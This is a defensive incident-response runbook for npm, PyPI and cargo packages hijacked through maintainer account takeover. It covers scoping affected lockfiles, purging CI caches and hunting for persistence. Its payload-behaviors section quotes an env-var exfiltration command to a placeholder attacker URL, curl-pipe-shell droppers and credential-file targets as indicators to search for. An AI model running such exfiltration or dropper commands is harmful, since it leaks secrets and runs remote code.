# Runbook: Maintainer Account Takeover (Shai-Hulud / axios-style)

## Pattern

An attacker compromises a package maintainer's credentials (phishing, leaked token, session theft) and publishes a malicious version under the legitimate package name. The payload typically runs at install time — `postinstall` for npm, `setup.py`/`.pth` for Python — and exfiltrates environment variables, CI secrets, or cloud credentials to an attacker-controlled URL. The malicious version is often yanked within hours, but every CI run, developer install, and cached artifact during the window is potentially compromised.

## Scope Determination

Search every lockfile and manifest for the package name. `-A3` prints the lines after each hit, where most lockfiles record the resolved version. The leading `*` also matches lockfiles in subdirectories.

```bash
git grep -nwF -A3 '<pkg>' -- '*package-lock.json' '*yarn.lock' '*pnpm-lock.yaml' \
  '*uv.lock' '*poetry.lock' '*pixi.lock' '*conda-lock.yml' '*Cargo.lock' '*go.sum' \
  '*package.json' '*pyproject.toml' '*requirements*.txt' '*environment*.yml' '*pixi.toml' '*Cargo.toml' '*go.mod'
```

Where each lockfile records the version:

- `package-lock.json`: `"version"` on the line after `"node_modules/<pkg>"`.
- `yarn.lock`: `version` on the line after `<pkg>@<range>:`.
- `pnpm-lock.yaml`: in the key, `<pkg>@<version>:`.
- `uv.lock`, `poetry.lock`, `Cargo.lock`: `version` on the line after `name = "<pkg>"`.
- `conda-lock.yml`: `version:` on the line after `name: <pkg>`.
- `pixi.lock`: in the package URL, `<pkg>-<version>-…`.
- `go.sum`: on the same line, `<module> v<version>`.

Then find when the bad version entered and left. Search for the version, not the package name: a version bump doesn't change how often the name appears, so `-S'<pkg>'` misses it. Confirm each hit with `git show <hash>`.

```bash
git log -S'<bad-version>' --format='%h %cI %s' -- '*package-lock.json' '*yarn.lock' '*pnpm-lock.yaml' \
  '*uv.lock' '*poetry.lock' '*pixi.lock' '*conda-lock.yml' '*Cargo.lock' '*go.sum'
```

Record every `file:line` hit. No hit in any lockfile = PASS for the lockfile check.

## CI Cache Nuke

Every cache created since the window opened may contain the bad version. There is no end bound: a partial restore-key match copies an old cache's contents into the next one saved. Write the start as `<YYYY-MM-DDTHH:MM>` in UTC, without seconds, so the string comparison with `createdAt` stays correct.

```bash
# List caches created since the window opened
gh cache list --sort created_at --order desc --limit 1000 \
  --json id,key,createdAt,ref \
  --jq '.[] | select(.createdAt >= "<YYYY-MM-DDTHH:MM>") | "\(.id) \(.createdAt) \(.ref) \(.key)"'

# Delete them by id (one key can be shared by caches on several refs)
gh cache list --sort created_at --order desc --limit 1000 --json id,createdAt \
  --jq '.[] | select(.createdAt >= "<YYYY-MM-DDTHH:MM>") | .id' \
  | while read -r id; do gh cache delete "$id"; done
```

Also purge any registry mirror caches (Artifactory, Verdaccio, devpi) covering the window — cache nuke is incomplete without these.

## Persistence Hunt

The payload may have written files that survive a `node_modules` or virtualenv rebuild. `find -newermt` takes a date (`-newer` takes a file). Write it as `"<YYYY-MM-DD HH:MM> UTC"`: BSD find (macOS) rejects ISO 8601 with `T` and `Z`, while GNU find accepts both.

**npm:**
```bash
# Entries in node_modules/.bin changed since the window opened. No -type f: the
# shims are symlinks, and -type f (or -L, which checks the target) skips them.
find node_modules/.bin -mindepth 1 -newermt "<YYYY-MM-DD HH:MM> UTC" -exec ls -l {} +
# Unexpected .npmrc entries (e.g., custom registry, prepublish hooks)
cat .npmrc ~/.npmrc 2>/dev/null
# Every installed package with an install-time script, scoped packages included
npm query ':attr(scripts, [preinstall]), :attr(scripts, [install]), :attr(scripts, [postinstall])' \
  | jq -r '.[] | "\(.location): \(.scripts | tojson)"'
```

**Python:** for `.pth` files, use the PyPI `.pth` check in `supply-chain-ecosystem-quirks`. Then look for start-up hooks in every site directory, including the user site, where `usercustomize.py` lives:
```bash
find $(python -c 'import site; print(*site.getsitepackages(), site.getusersitepackages())') \
  \( -name sitecustomize.py -o -name usercustomize.py \) 2>/dev/null
```

**cargo:**
```bash
# Build scripts built since the window opened
find target -name 'build-script-build' -newermt "<YYYY-MM-DD HH:MM> UTC"
# Suspicious build.rs in vendored deps
grep -rE 'Command::new|reqwest|curl' ~/.cargo/registry/src/*/<pkg>-*/build.rs 2>/dev/null
```

Any hit → EXPOSED, remove the artifact, add to incident report evidence.

## Common Payload Behaviors

- **Env var exfiltration:** `curl -X POST <attacker-url> -d "$(env)"` or equivalent in any language. Search CI logs for outbound POSTs to unknown hosts during exposure window.
- **Dropper for second-stage:** payload downloads and executes a follow-up binary. Look for `curl | sh`, `wget -O - | bash`, or `eval(fetch(...))` patterns in install scripts.
- **Credential theft from disk:** reads `~/.aws/credentials`, `~/.npmrc`, `~/.docker/config.json`, `.git-credentials`. Treat any secret stored unencrypted on disk during the window as compromised.
- **Worm propagation:** payload uses the stolen npm/PyPI token to publish itself to other packages owned by the same maintainer (Shai-Hulud signature behavior). Audit the affected maintainer's full package list, not just the named package.
